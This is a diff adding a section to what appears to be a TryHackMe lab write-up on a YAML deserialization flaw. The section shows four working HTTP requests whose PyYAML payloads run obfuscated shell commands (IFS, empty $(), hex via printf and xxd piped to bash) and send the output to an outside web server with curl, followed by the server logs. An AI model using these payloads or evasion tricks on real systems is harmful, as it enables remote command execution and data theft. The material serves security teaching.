@@ -59,6 +59,89 @@ drwxr-xr-x 2 bartender        bartender 4096 Jul 28 18:37 __pycache__
 drwxr-xr-x 2 bartender        bartender 4096 Jun 11 10:47 templates
 ```
 
+<h2>Obfuscation Of Our Payload</h2>
+
+There is no WAF, so our payloads reach the target server with no restrictions, however, if there was a WAF then we would need to obfuscate our payloads. We can do so in multiple ways
+
+**Obfuscation of the `whoami` command**
+
+<mark>$(IFS) Empty Space</mark>
+
+```
+POST /import HTTP/1.1
+Host: random-tryhackme-lab-environment.com
+Cookie: session=redacted
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 133
+
+playlist=!!python/object/apply:os.system+["curl+\"http://my-web-server:1337/?output=$(who$(IFS)ami+|+base64+-w0)\""]&playlist_file=
+```
+
+```
+redacted - - [17/Nov/2026 07:34:28] "GET /?output=YmFydGVuZGVyCg== HTTP/1.1" 200 -
+```
+
+base64 decoded whoami output: bartender
+
+**Obfuscation of the `whoami` command**
+
+<mark>$() Empty Space</mark>
+
+```
+POST /import HTTP/1.1
+Host: random-tryhackme-lab-environment.com
+Cookie: session=redacted
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 130
+
+playlist=!!python/object/apply:os.system+["curl+\"http://my-web-server:1337/?output=$(who$()ami+|+base64+-w0)\""]&playlist_file=
+```
+
+```
+redacted - - [17/Nov/2026 07:41:30] "GET /?output=YmFydGVuZGVyCg== HTTP/1.1" 200 -
+```
+
+base64 decoded whoami output: bartender
+
+**Obfuscation of the `whoami` command**
+
+<mark>$(printf '/hex/values/for/whoami')</mark>
+
+```
+POST /import HTTP/1.1
+Host: random-tryhackme-lab-environment.com
+Cookie: session=redacted
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 157
+
+playlist=!!python/object/apply:os.system+["curl+\"http://my-web-server:1337/?output=$($(printf+'\x77\x68\x6f\x61\x6d\x69')+|+base64+-w0)\""]&playlist_file=
+```
+
+```
+redacted - - [17/Nov/2026 07:43:48] "GET /?output=YmFydGVuZGVyCg== HTTP/1.1" 200 -
+```
+
+base64 decoded whoami output: bartender
+
+**Obfuscation of the `whoami` command**
+
+<mark>echo 'hex-with-no-spaces' | xxd -r -p | ba$()sh</mark>
+
+```
+POST /import HTTP/1.1
+Host: random-tryhackme-lab-environment.com
+Cookie: session=redacted
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 160
+
+playlist=!!python/object/apply:os.system+["curl+\"http://my-web-server:1337/?output=$(echo+'77686f616d69'+|+xxd+-r+-p+|ba$()sh|+base64+-w0)\""]&playlist_file=
+```
+
+```
+redacted - - [17/Nov/2026 07:55:25] "GET /?output=YmFydGVuZGVyCg== HTTP/1.1" 200 -
+```
+
+base64 decoded whoami output: bartender
 
 <h1>The Vulnerable Source Code</h1>
 
